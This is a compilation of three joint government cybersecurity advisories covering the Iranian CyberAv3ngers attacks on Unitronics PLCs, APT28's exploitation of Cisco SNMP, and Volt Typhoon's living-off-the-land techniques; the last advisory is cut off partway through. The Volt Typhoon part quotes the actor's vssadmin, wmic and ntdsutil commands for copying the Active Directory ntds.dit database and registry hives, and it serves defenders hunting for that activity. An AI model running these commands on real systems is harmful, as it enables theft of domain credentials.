Co-Authored by:
TLP:CLEAR
Product ID: AA23-335A
December 14, 2023
December 5, 2023December 1,
2023
IRGC-Affiliated Cyber Actors Exploit PLCs in
Multiple Sectors, Including U.S. Water and
Wastewater Systems Facilities
SUMMARY
The Federal Bureau of Investigation (FBI), Cybersecurity
and Infrastructure Security Agency (CISA), National
Security Agency (NSA), Environmental Protection Agency
(EPA), and the Israel National Cyber Directorate (INCD)
hereafter referred to as "the authoring agencies"
disseminating this joint Cybersecurity Advisory (CSA) to
highlight continued malicious cyber activity against
operational technology devices by Iranian Government
Islamic Revolutionary Guard Corps (IRGC)-affiliated
Advanced Persistent Threat (APT) cyber actors.
Actions to take today to mitigate
malicious activity:
Implement multifactor
authentication.
Use strong, unique
passwords.
Check PLCs for default
passwords.
The IRGC is an Iranian military organization that the United States designated as a foreign terrorist
organization in 2019. IRGC-affiliated cyber actors using the persona 
CyberAv3ngers
 are actively
targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers
(PLCs). These PLCs are commonly used in the Water and Wastewater Systems (WWS) Sector and
are additionally used in other industries including, but not limited to, energy, food and beverage
manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers
and companies. In addition to the recent CISA Alert, the authoring agencies are releasing this joint
CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs)
associated with IRGC cyber operations.
Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise
default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image
stating, 
You have been hacked, down with Israel. Every equipment 
made in Israel
 is CyberAv3ngers
legal target.
 The victims span multiple U.S. states. The authoring agencies urge all organizations,
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI
field office or CISA
s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the
following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected;
type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries
minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to
standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic
Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations
section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated
with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber
activity, see CISA
s Iran Cyber Threat Overview and Advisories webpage and the FBI
s Iran Threat
webpage.
For a downloadable copy of IOCs, see:
AA23-335A (STIX XML, 16KB)
AA23-335A (STIX JSON, 11KB)
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK
 for Enterprise framework, version 14. See Table 1 for
threat actor activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping
malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK
s Best
Practices for MITRE ATT&CK Mapping and CISA
s Decider Tool.
Overview
CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona
that has claimed responsibility for numerous attacks against critical infrastructure
organizations.[1],[2],[3],[4],[5] The group claimed responsibility for cyberattacks in Israel beginning in
2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in
Israel.[2] CyberAv3ngers also reportedly has connections to another IRGC-linked group known as
Soldiers of Solomon.
(Updated December 14, 2023) Most recently, CyberAv3ngers began targeting U.S.-based WWS
facilities that operate Unitronics PLCs.[1] The threat actors compromised Unitronics Vision Series
PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to
the internet with default passwords and by default are on TCP port 20256. On December 11, 2023,
CVE-2023-6448 was assigned to address the default passwords [CWE-798: Use of Hard Coded
Credentials], and CISA added the CVE to its Known Exploited Vulnerabilities Catalog. On December
12, Unitronics released VisiLogic version 9.9.00 software to address this CVE; the update requires
users to change default passwords.
These PLC and related controllers are often exposed to outside internet connectivity due to the
remote nature of their control and monitoring functionalities. The compromise is centered around
defacing the controller
s user interface and may render the PLC inoperative. With this type of access,
deeper device and network level accesses are available and could render additional, more profound
cyber physical effects on processes and equipment. It is not known if additional cyber activities
deeper into these PLCs or related control networks and components were intended or achieved.
Organizations should consider and evaluate their systems for these possibilities.
Page 2 of 7 | Product ID: AA23-335A
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
Threat Actor Activity
The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when
the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since
November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple
U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely
compromised these PLCs since the PLCs were internet-facing and used Unitronics
 default password.
Observed activity includes the following:
Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel
displayed both legitimate and false claims of multiple cyberattacks against Israel.
CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.
On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility
for compromising over 50 servers, security cameras, and smart city management systems in
Israel; however, majority of these claims were proven false. The group claimed to use a
ransomware named 
Crucio
 against servers where the webcams camera software operated
on port 7001.
Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS
facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising
internet-accessible devices with default passwords. The targeted PLCs displayed the
defacement message, 
You have been hacked, down with Israel. Every equipment 
made in
Israel
 is Cyberav3ngers legal target.
INDICATORS OF COMPROMISE
See Table 1 for observed IOCs related to CyberAv3nger operations.
(Updated December 14, 2023)
Table 1: CyberAv3nger IOCs
Indicator
Type
Fidelity
Description
BA284A4B508A7ABD8070A427386E93E0
Suspected
MD5 hash
associated with
Crucio
Ransomware
66AE21571FAEE1E258549078144325DC9DD
60303
SHA1
Suspected
SHA1 hash
associated with
Crucio
Ransomware
440b5385d3838e3f6bc21220caa83b65cd5f361
8daea676f271c3671650ce9a3
SHA256
Suspected
SHA256 hash
associated with
Page 3 of 7 | Product ID: AA23-335A
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
Indicator
Type
Fidelity
Description
Crucio
Ransomware
178.162.227[.]180
IP address
Suspected
Crucio
Ransomware
185.162.235[.]206
IP address
Suspected
Crucio
Ransomware
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 2 for referenced threat actor tactics and techniques in this advisory.
Table 2: Initial Access
Technique Title
Brute Force
Techniques
T1110
Threat actors obtained login credentials, which they used
to successfully log into Unitronics devices and provide
root-level access.
MITIGATIONS
The authoring agencies recommend critical infrastructure organizations, including WWS sector
facilities, implement the following mitigations to improve your organization
s cybersecurity posture to
defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity
Performance Goals (CPGs) developed by CISA and the National Institute of Standards and
Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and
NIST recommend all organizations implement. CISA and NIST based the CPGs on existing
cybersecurity frameworks and guidance to protect against the most common and impactful threats,
tactics, techniques, and procedures. Visit CISA
s Cross-Sector Cybersecurity Performance Goals for
more information on the CPGs, including additional recommended baseline protections.
Note: The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all
internet-facing PLCs.
Network Defenders
The cyber threat actors likely accessed the affected devices
Unitronics Vision Series PLCs with
by exploiting cybersecurity weaknesses, including poor password security and exposure to the
Page 4 of 7 | Product ID: AA23-335A
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
internet. To safeguard against this threat, the authoring agencies urge organizations to consider the
following:
Immediate steps to prevent attack:
(Updated December 14, 2023) Upgrade devices to 9.9.00 VisiLogic software, which requires
users to change the default passwords on PLCs and HMIs. Use a strong password. For more
information, see Unitronics
 blog Unitronics Cybersecurity for Vision and Samba PLC Series
and Release notes for VisiLogic 9.9.00.
Disconnect the PLC from the public-facing internet.
Follow-on steps to strengthen your security posture:
Implement multifactor authentication for access to the operational technology (OT) network
whenever applicable.
If you require remote access, implement a firewall and/or virtual private network (VPN) in front
of the PLC to control network access. A VPN or gateway device can enable multifactor
authentication for remote access even if the PLC does not support multifactor authentication.
Create strong backups of the logic and configurations of PLCs to enable fast recovery.
Familiarize yourself with factory resets and backup deployment as preparation in the event of
ransomware activity.
Keep your Unitronics and other PLC devices updated with the latest versions by the
manufacturer.
Confirm third-party vendors are applying the above recommended countermeasures to
mitigate exposure of these devices and all installed equipment.
In addition, the authoring agencies recommend network defenders apply the following mitigations to
limit potential adversarial use of common system and network discovery techniques, and to reduce
the impact and risk of compromise by cyber threat actors:
Reduce risk exposure. CISA offers a range of services at no cost, including scanning and
testing to help organizations reduce exposure to threats via mitigating attack vectors. CISA
Cyber Hygiene services can help provide additional review of organizations
 internetaccessible assets. Email vulnerability@cisa.dhs.gov with the subject line, 
Requesting Cyber
Hygiene Services
 to get started.
Device Manufacturers
Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC
devices can take steps to mitigate the risks, it is ultimately the responsibility of the device
manufacturer to build products that are secure by design and default. The authoring agencies urge
device manufacturers to take ownership of the security outcomes of their customers by following the
principles in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for
Secure by Design Software, primarily:
Do not ship products with default passwords. Instead, either ship products with random initial
passwords or require users to change the password upon first use.
Page 5 of 7 | Product ID: AA23-335A
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
Do not expose administrative interfaces to the internet by default, and take steps to introduce
friction should a device be placed in an insecure state.
Do not charge extra for basic security features needed to operate the product securely.
Support multifactor authentication, including via phishing-resistant methods.
By using secure by design tactics, software manufacturers can make their product lines secure 
out of
the box
 without requiring customers to spend additional resources making configuration changes,
purchasing tiered security software and logs, monitoring, and making routine updates.
For more information on common misconfigurations and guidance on reducing their prevalence, see
joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations.
For more information on secure by design, see CISA
s Secure by Design and Default webpage and
joint guide.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and
validating your organization's security program against the threat behaviors mapped to the MITRE
ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your
existing security controls inventory to assess how they perform against the ATT&CK techniques
described in this advisory.
To get started:
Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies
 performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance
data.
6. Tune your security program, including people, processes, and technologies, based on the
data generated by this process.
The authoring agencies recommend continually testing your security program, at scale, in a
production environment to ensure optimal performance against the MITRE ATT&CK techniques
identified in this advisory.
RESOURCES
EPA: Cybersecurity for the Water Sector
CISA: Water and Wastewater Systems Sector
CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems
CISA: Iran Cyber Threat Overview and Advisories
FBI: The Iran Threat - Web Page
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
Page 6 of 7 | Product ID: AA23-335A
TLP:CLEAR
TLP:CLEAR CISA | FBI | NSA | EPA | INCD
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by
Design Software
CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management
Interfaces from Malicious Cyber Activity
CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity
Misconfigurations
CISA: Secure by Design and Default
REPORTING
All organizations should report suspicious or criminal activity related to information in this CSA to
CISA via CISA
s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages
recipients of this document to report information concerning suspicious or criminal activity to their
local FBI field office or IC3.gov. For NSA client requirements or general cybersecurity inquiries,
contact Cybersecurity_Requests@nsa.gov.
Additionally, the Water ISAC encourages members to share information by emailing
analyst@waterisac.org, calling 866-H2O-ISAC, or using the online incident reporting form. State,
local, tribal, and territorial governments should report incidents to the MS-ISAC (SOC@cisecurity.org
or 866-787-4722).
REFERENCES
[1] CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group
[2] Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare
[3] Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack
[4] Dark Reading: Pro-Iranian Attackers Claim to Target Israeli Railroad Network
[5] Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers
[6] X: @CyberAveng3rs
DISCLAIMER
The information in this report is being provided 
as is
 for informational purposes only. The authoring
agencies do not endorse any commercial entity, product, company, or service, including any entities,
products, or services linked within this document. Any reference to specific commercial entities,
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not
constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
VERSION HISTORY
December 1, 2023: Initial version.
December 14, 2023: Added CVE, patch information, and IOC descriptions.
Page 7 of 7 | Product ID: AA23-335A
TLP:CLEAR
Advisory.
APT28 exploits known
vulnerability to carry out
reconnaissance and deploy
malware on Cisco routers
Version 1
April 2023
 Crown Copyright 2023
APT28 exploits known vulnerability to carry out
reconnaissance of routers and deploy malware
APT28 accesses poorly maintained Cisco routers and deploys
malware on unpatched devices using CVE-2017-6742.
Overview and context
The UK National Cyber Security Centre (NCSC), the US National Security Agency
(NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal
Bureau of Investigation (FBI) are releasing this joint advisory to provide details of
tactics, techniques and procedures (TTPs) associated with APT28
s exploitation of
Cisco routers in 2021.
We assess that APT28 is almost certainly the Russian General Staff Main
Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military
Intelligence Unit 26165. APT28 (also known as Fancy Bear, STRONTIUM, Pawn
Storm, the Sednit Gang and Sofacy) is a highly skilled threat actor.
Previous activity
The NCSC has previously attributed the following activity to APT28:
 cyber attacks against the German parliament in 2015, including data theft and
disrupting email accounts of German Members of Parliament (MPs) and the
Vice Chancellor
 attempted attack against the Organisation for the Prohibition of Chemical
Weapons (OPCW) in April 2018, to disrupt independent analysis of chemicals
weaponised by the GRU in the UK
For more information on APT28 activity, see the advisory 
Russian State-Sponsored
and Criminal Cyber Threats to Critical Infrastructure
 and 
Russian GRU Conducting
Global Brute Force Campaign to Compromise Enterprise and Cloud Environments
As of 2021, APT28 has been observed using commercially available code
repositories, and post-exploit frameworks such as Empire. This included the use of
Powershell Empire, in addition to Python versions of Empire.
Reconnaissance
Use of SNMP protocol to access routers
In 2021, APT28 used infrastructure to masquerade Simple Network Management
protocol (SNMP) access into Cisco routers worldwide. This included a small number
based in Europe, US government institutions and approximately 250 Ukrainian
victims.
SNMP is designed to allow network administrators to monitor and configure network
devices remotely, but it can also be misused to obtain sensitive network information
and, if vulnerable, exploit devices to penetrate a network.
A number of software tools can scan the entire network using SNMP, meaning that
poor configuration such as using default or easy-to-guess community strings, can
make a network susceptible to attacks.
Weak SNMP community strings, including the default 
public
, allowed APT28 to gain
access to router information. APT28 sent additional SNMP commands to enumerate
router interfaces. [T1078.001]
The compromised routers were configured to accept SNMP v2 requests. SNMP v2
doesn
t support encryption and so all data, including community strings, is sent
unencrypted.
Exploitation of CVE-2017-6742
APT28 exploited the vulnerability CVE-2017-6742 (Cisco Bug ID: CSCve54313)
[T1190]. This vulnerability was first announced by Cisco on 29 June 2017, and
patched software was made available.
Cisco's published advisory provided workarounds, such as limiting access to SNMP
from trusted hosts only, or by disabling a number of SNMP Management Information
bases (MIBs).
Malware deployment
For some of the targeted devices, APT28 actors used an SNMP exploit to deploy
malware, as detailed in the NCSC
s Jaguar Tooth malware analysis report. This
malware obtained further device information, which is exfiltrated over trivial file
transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.
The actor obtained this device information by executing a number of Command Line
Interface (CLI) commands via the malware. It includes discovery of other devices on
the network by querying the Address Resolution Protocol (ARP) table to obtain MAC
addresses [T1590]
Indicators of compromise (IoCs)
Please refer to the accompanying malware analysis report for indicators of
compromise which may help to detect this activity.
MITRE ATT&CK
This advisory has been compiled with respect to the MITRE ATT&CK
 framework, a
globally accessible knowledge base of adversary tactics and techniques based on
real-world observations.
For detailed TTPs, see the Jaguar Tooth malware analysis report.
Tactic
Technique
Procedure
Initial
Access
T1190
Exploit Publicfacing
Application.
Initial
Access
T1078.001
Valid Accounts.
Default Accounts.
Reconnais
sance
T1590
Gather victim
network
information
APT28 exploited
default/well-known
community strings in
SNMP as outlined in
CVE-2017-6742 (Cisco
Bug ID: CSCve54313)
Actors accessed
victim routers by
using default
community strings
such as 
public
Access was gained to
perform
reconnaissance on
victim devices.
Further detail of how
this was achieved in
available in the
MITRE ATT&CK section
of the Jaguar Tooth
Conclusion
APT28 has been known to access vulnerable routers by using default and weak
SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID:
CSCve54313) as published by Cisco and highlighted in their related blog.
Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers
TTPs in this advisory may still be used against vulnerable Cisco devices.
Organisations are advised to follow the mitigation advice in this advisory to defend
against this activity.
Reporting
UK organisations should report any suspected compromises to the NCSC.
US organisations should contact CISA
s 24/7 Operations Centre at Report@cisa.gov
or (888) 282-0870
Mitigation
o Patch devices as advised by Cisco. The NCSC also has general guidance on
managing updates and keeping software up to date.
o Do not use SNMP if you are not required to configure or manage devices
remotely to prevent unauthorised users from accessing your router.
 If you are required to manage routers remotely, establish allow and
deny lists for SNMP messages to prevent unauthorised users from
accessing your router.
o Do not allow unencrypted (ie, plaintext) management protocols, such as
SNMP v2 and Telnet. Where encrypted protocols aren
t possible, you should
carry out any management activities from outside the organisation through
an encrypted virtual private network (VPN), where both ends are mutually
authenticated.
o Enforce a strong password policy. Don
t reuse the same password for
multiple devices. Each device should have a unique password. Where
possible, avoid legacy password-based authentication and implement twofactor authentication based on public-private key.
o Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.
Where possible, use modern encrypted protocols such as SSH and SNMP v3.
Harden the encryption protocols based on current best security practice. The
NCSC strongly advises owners and operators to retire and replace legacy
devices that can
t be configured to use SNMP v3.
o Use logging tools to record commands executed on your network devices,
such as TACACS+ and Syslog. Use these logs to immediately highlight
suspicious events and keep a record of events to support an investigation if
the device
s integrity is ever in question. See NCSC guidance on monitoring
and logging.
o If you suspect your router has been compromised:
 Follow Cisco
s advice for verifying the Cisco IOS image.
 Revoke all keys associated with that router. When replacing the router
configuration be sure to create new keys rather than pasting from the
old configuration.
Replace both the ROMMON and Cisco IOS image with an image that
has been sourced directly from the Cisco website, in case third party
and internal repositories have been compromised.
s Network Infrastructure guide provides some best practices for SNMP.
See also the Cisco IOS hardening guide
Disclaimers
This report draws on information derived from NCSC and industry sources. Any NCSC
findings and recommendations made have not been provided with the intention of
avoiding all risks and following the recommendations will not remove all such risk.
Ownership of information risks remains with the relevant system owner at all times.
All material is UK Crown Copyright 
Joint Cybersecurity Advisory
TLP:CLEAR
People's Republic of China State-Sponsored Cyber
Actor Living off the Land to Evade Detection
Summary
The United States and international cybersecurity authorities are issuing this joint
Cybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of
interest associated with a People
s Republic of China (PRC) state-sponsored cyber
actor, also known as Volt Typhoon. Private sector partners have identified that this
activity affects networks across U.S. critical infrastructure sectors, and the authoring
agencies believe the actor could apply the same techniques against these and other
sectors worldwide.
This advisory from the United States National Security Agency (NSA), the U.S.
Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of
Investigation (FBI), the Australian Signals Directorate
s Australian Cyber Security
Centre (ACSC), the Communications Security Establishment
s Canadian Centre for
Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ),
and the United Kingdom National Cyber Security Centre (NCSC-UK) (hereafter referred
to as the 
authoring agencies
) provides an overview of hunting guidance and
associated best practices to detect this activity.
One of the actor
s primary tactics, techniques, and procedures (TTPs) is living off the
land, which uses built-in network administration tools to perform their objectives. This
TTP allows the actor to evade detection by blending in with normal Windows system
and network activities, avoid endpoint detection and response (EDR) products that
would alert on the introduction of third-party applications to the host, and limit the
amount of activity that is captured in default logging configurations. Some of the built-in
tools this actor uses are: wmic, ntdsutil, netsh, and PowerShell. The advisory
Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no foreseeable
risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be
distributed without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
provides examples of the actor
s commands along with detection signatures to aid
network defenders in hunting for this activity. Many of the behavioral indicators included
can also be legitimate system administration commands that appear in benign activity.
Care should be taken not to assume that findings are malicious without further
investigation or other indications of compromise.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
Contents
People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade
Detection ......................................................................................................................... 1
Summary ......................................................................................................................... 1
Technical Details ............................................................................................................. 4
Background ..................................................................................................................... 4
Artifacts ........................................................................................................................... 4
Network artifacts .......................................................................................................... 4
Host artifacts ................................................................................................................ 5
Windows management instrumentation (WMI/WMIC).............................................. 5
Ntds.dit Active Directory database ........................................................................... 5
PortProxy ................................................................................................................. 8
PowerShell ............................................................................................................. 10
Impacket ................................................................................................................ 10
Enumeration of the environment ............................................................................ 11
Additional credential theft ....................................................................................... 12
Additional commands ............................................................................................. 12
Mitigations ..................................................................................................................... 13
Logging recommendations ........................................................................................ 14
Indicators of compromise (IOCs) summary ................................................................... 15
TTPs .......................................................................................................................... 15
Command execution .................................................................................................. 16
Command line patterns.............................................................................................. 18
File paths ................................................................................................................... 18
File names ................................................................................................................. 18
SHA-256 file hashes .................................................................................................. 18
User-agent ................................................................................................................. 19
Yara rules .................................................................................................................. 19
References .................................................................................................................... 21
Acknowledgements ....................................................................................................... 22
Appendix: MITRE ATT&CK Techniques........................................................................ 23
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
Technical Details
This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the
Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.
Background
The authoring agencies are aware of recent People
s Republic of China (PRC) statesponsored cyber activity and have identified potential indicators associated with these
techniques. This advisory will help net defenders hunt for this activity on their systems.
It provides many network and host artifacts associated with the activity occurring after
the network has been initially compromised, with a focus on command lines used by the
cyber actor. An Indicators of compromise (IOCs) summary is included at the end of this
advisory. For a downloadable copy of IOCs, see aa23-144a.stix_.xml (STIX, 35 kB).
Especially for living off the land techniques, it is possible that some command lines
might appear on a system as the result of benign activity and would be false positive
indicators of malicious activity. Defenders must evaluate matches to determine their
significance, applying their knowledge of the system and baseline behavior.
Additionally, if creating detection logic based on these commands, network defenders
should account for variability in command string arguments, as items such as ports
used may differ across environments.
Artifacts
Network artifacts
The actor has leveraged compromised small office/home office (SOHO) network
devices as intermediate infrastructure to obscure their activity by having much of the
command and control (C2) traffic emanate from local ISPs in the geographic area of the
victim. Owners of SOHO devices should ensure that network management interfaces
are not exposed to the Internet to avoid them being re-purposed as redirectors by
malicious actors. If they must be exposed to the Internet, device owners and operators
should ensure they follow zero trust principles and maintain the highest level of
authentication and access controls possible.
The actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with
hardcoded C2 callbacks [T1090] to ports 8080, 8443, 8043, 8000, and 10443 with
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
various filenames including, but not limited to: cisco_up.exe, cl64.exe, vm3dservice.exe,
watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe.
Host artifacts
Windows management instrumentation (WMI/WMIC)
The actor has executed the following command to gather information about local drives
[T1082]:
cmd.exe /C "wmic path win32_logicaldisk get
caption,filesystem,freespace,size,volumename"
This command does not require administrative credentials to return results. The
command uses a command prompt [T1059.003] to execute a Windows Management
Instrumentation Command Line (WMIC) query, collecting information about the storage
devices on the local host, including drive letter, file system (e.g., new technology file
system [NTFS]), free space and drive size in bytes, and an optional volume name.
Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a
user to access management information from hosts in an enterprise environment. The
command line version of WMI is called WMIC.
By default, WMI Tracing is not enabled, so the WMI commands being executed and the
associated user might not be available. Additional information on WMI events and
tracing can be found in the References section of the advisory.
Ntds.dit Active Directory database
The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from
Windows domain controllers (DCs) out of the network to perform password cracking
[T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by
default, is stored at %SystemRoot%\NTDS\ntds.dit. This file contains information
about users, groups, group memberships, and password hashes for all users in the
domain; the SYSTEM registry hive contains the boot key that is used to encrypt
information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a
copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file
from the Shadow Copy. The SYSTEM registry hive may also be obtained from the
Shadow Copy. The following example commands show the actor creating a Shadow
Copy and then extracting a copy of the ntds.dit file from it.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
cmd /c vssadmin create shadow /for=C: >
C:\Windows\Temp\<filename>.tmp
cmd /c copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTD
S\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp
The built-in Ntdsutil.exe tool performs all these actions using a single command. There
are several ways to execute Ntdsutil.exe, including running from an elevated command
prompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the
execution of Ntdsutil.exe commands using long, short, or a combination of the
notations. For example, the long notation command activate instance ntds ifm
can also be executed using the short notation ac i ntds i. Table 1 provides the long
and short forms of the arguments used in the sample Ntdsutil.exe command, along with
a brief description of the arguments.
Table 1: Ntdsutil.exe command syntax
Long form
Short form
activate instance %
ac i %
Description
Sets variable % as the active instance for
ntdsutil to use
Install from media (ifm). Creates
installation media to be used with
DCPromo so the server will not need to
copy data from another Domain
Controller on the network
The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file
and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is
a standalone example; multiple examples are provided to show how syntax and file
paths may differ per environment.
wmic process call create "ntdsutil \"ac i ntds\" ifm \"create
full C:\Windows\Temp\pro
wmic process call create "cmd.exe /c ntdsutil \"ac i ntds\"
ifm \"create full C:\Windows\Temp\Pro"
wmic process call create "cmd.exe /c mkdir
C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create
full C:\Windows\Temp\tmp\"
"cmd.exe" /c wmic process call create "cmd.exe /c mkdir
C:\windows\Temp\McAfee_Logs & ntdsutil \"ac i ntds\" ifm
\"create full C:\Windows\Temp\McAfee_Logs\"
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
cmd.exe /Q /c wmic process call create "cmd.exe /c mkdir
C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create
full C:\Windows\Temp\tmp\" 1>
\\127.0.0.1\ADMIN$\<timestamp value> 2>&1
Note: The <timestamp value> would be an epoch timestamp following the format
like 
__1684956600.123456
Each actor command above creates a copy of the ntds.dit database and the SYSTEM
and SECURITY registry hives in the C:\Windows\Temp\<folder> directory, where
<folder> is replaced with the path specified in the command (e.g., pro, tmp, or
McAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\Windows\, so
the last command will direct standard output and error messages from the command to
a file within the folder specified.
The actor has also saved the files directly to the C:\Windows\Temp and
C:\Users\Public directories, so the entirety of those directory structures should be
analyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command:
an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry
folder that contains the SYSTEM and SECURITY hives. Defenders should look for this
folder structure across their network:
<path specified in command>\Active Directory\ntds.dit
<path specified in command>\Active Directory\ntds.jfm
<path specified in command>\registry\SECURITY
<path specified in command>\registry\SYSTEM
When one of the example commands is executed, several successive log entries are
created in the Application log, under the ESENT Source. Associated events can be
viewed in Windows Event Viewer by navigating to: Windows Logs | Application. To
narrow results to relevant events, select Filter Current Log from the Actions menu on
the right side of the screen. In the Event sources dropdown, check the box next to
ESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK box
will apply the filters to the results.
Since ESENT logging is used extensively throughout Windows, defenders should focus
on events that reference ntds.dit. If such events are present, the events
 details should
contain the file path where the file copies were created. Since these files can be
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
deleted, or enhanced logging may not be configured on hosts, the file path can greatly
aid in a hunt operation. Identifying the user associated with this activity is also a critical
step in a hunt operation as other actions by the compromised
or actor-created
user
account can be helpful to understand additional actor TTPs, as well as the breadth of
the actor's actions.
Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain
should be considered compromised, as the actor will generally be able to crack the
password hashes for domain user accounts, create their own accounts, and/or join
unauthorized systems to the domain. If this occurs, defenders should follow guidance
